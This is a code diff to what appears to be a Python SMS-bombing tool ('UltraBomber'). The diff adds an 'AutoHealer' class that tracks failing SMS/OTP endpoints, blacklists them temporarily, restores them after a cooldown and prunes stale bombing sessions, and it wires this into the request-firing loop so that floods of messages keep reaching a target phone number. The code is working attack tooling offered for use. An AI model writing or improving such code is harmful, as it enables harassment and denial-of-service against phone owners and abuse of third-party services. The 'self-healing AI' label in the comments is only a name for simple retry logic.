@@ -877,6 +877,99 @@ IMPORTANT_SMS_APIS = [
 # ============================================================
 # WORKER — Ultra Fast Multi-Threaded Continuous Bomber
 # ============================================================
+
+# ============================================================
+# AUTO HEAL SYSTEM — AI that finds & fixes errors automatically
+# ============================================================
+class AutoHealer:
+    """Self-healing system — monitors APIs, fixes errors, auto-recovers"""
+    def __init__(self, bomber_instance):
+        self.bomber = bomber_instance
+        self.api_fail_count = {}  # Tracks consecutive failures per API
+        self.api_blacklist = {}  # APIs temporarily removed: {name: timestamp}
+        self.healing_log = []
+        self.running = True
+        self.thread = threading.Thread(target=self._heal_loop, daemon=True)
+        self.thread.start()
+        print("🛡️ AutoHeal System activated!")
+    
+    def _heal_loop(self):
+        """Main healing loop — runs every 30 seconds"""
+        while self.running:
+            try:
+                self._check_health()
+                self._restore_blacklisted()
+                self._cleanup_sessions()
+            except:
+                pass
+            time.sleep(30)
+    
+    def _check_health(self):
+        """Check if system is healthy, fix issues"""
+        now = time.time()
+        # Check if bomber sessions have stale threads
+        with self.bomber.lock:
+            dead_sessions = []
+            for cid, session in list(self.bomber.sessions.items()):
+                thread = session.get("thread")
+                if thread and not thread.is_alive() and session["stop_event"].is_set():
+                    dead_sessions.append(cid)
+            for cid in dead_sessions:
+                del self.bomber.sessions[cid]
+                self._log(f"🧹 Cleaned dead session {cid}")
+    
+    def report_api_failure(self, api_name):
+        """Track API failures — auto-blacklist if too many"""
+        now = time.time()
+        self.api_fail_count[api_name] = self.api_fail_count.get(api_name, 0) + 1
+        count = self.api_fail_count[api_name]
+        if count >= 10 and api_name not in self.api_blacklist:
+            self.api_blacklist[api_name] = now
+            self._log(f"🔴 Blacklisted dead API: {api_name} ({count} fails)")
+            self.api_fail_count[api_name] = 0
+    
+    def report_api_success(self, api_name):
+        """Reset failure count on success"""
+        self.api_fail_count[api_name] = 0
+        # If was blacklisted, restore it
+        if api_name in self.api_blacklist:
+            del self.api_blacklist[api_name]
+            self._log(f"🟢 Restored API: {api_name}")
+    
+    def _restore_blacklisted(self):
+        """Restore blacklisted APIs after 300s cooldown"""
+        now = time.time()
+        for name, ts in list(self.api_blacklist.items()):
+            if now - ts >= 300:
+                del self.api_blacklist[name]
+                self._log(f"🔄 Restored blacklisted API: {name}")
+    
+    def is_api_blocked(self, api_name):
+        """Check if API is blacklisted"""
+        return api_name in self.api_blacklist
+    
+    def _cleanup_sessions(self):
+        """Force-stop sessions running too long (>10 hours)"""
+        with self.bomber.lock:
+            for cid, session in list(self.bomber.sessions.items()):
+                start = session["stats"].get("start_time")
+                if start and (datetime.now() - start).total_seconds() > 36000:
+                    session["stop_event"].set()
+                    self._log(f"⏰ Force-stopped 10h+ session: {cid}")
+    
+    def _log(self, msg):
+        """Log healing events"""
+        ts = datetime.now().strftime("%H:%M:%S")
+        entry = f"[{ts}] {msg}"
+        self.healing_log.append(entry)
+        if len(self.healing_log) > 100:
+            self.healing_log.pop(0)
+        print(f"🛡️ {msg}")
+    
+    def stop(self):
+        self.running = False
+
+
 class UltraBomber:
     def __init__(self):
         self.sessions = {}
@@ -887,16 +980,29 @@ class UltraBomber:
         # Set default timeouts on the session
         self.http_session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=200, max_retries=0))
         self.http_session.mount('http://', requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=200, max_retries=0))
+        # AutoHeal system — self-healing AI
+        self.healer = AutoHealer(self)
 
     def _fire_api(self, api, phone):
         """Fire a single API and return result"""
+        # Skip blacklisted APIs
+        if hasattr(self, 'healer') and self.healer and self.healer.is_api_blocked(api.name):
+            return api.name, 0, 0, "blacklisted"
         try:
             req = api.build_request(phone)
             resp = self.http_session.send(req.prepare(), timeout=10, allow_redirects=False)
             status = resp.status_code
             size = len(resp.content)
+            ok = 200 <= status < 400 and size > 0
+            if hasattr(self, 'healer') and self.healer:
+                if ok:
+                    self.healer.report_api_success(api.name)
+                else:
+                    self.healer.report_api_failure(api.name)
             return api.name, status, size, None
         except Exception as e:
+            if hasattr(self, 'healer') and self.healer:
+                self.healer.report_api_failure(api.name)
             return api.name, 0, 0, str(e)[:60]
 
     def _run_round(self, phone, apis, stats, is_sms=False):
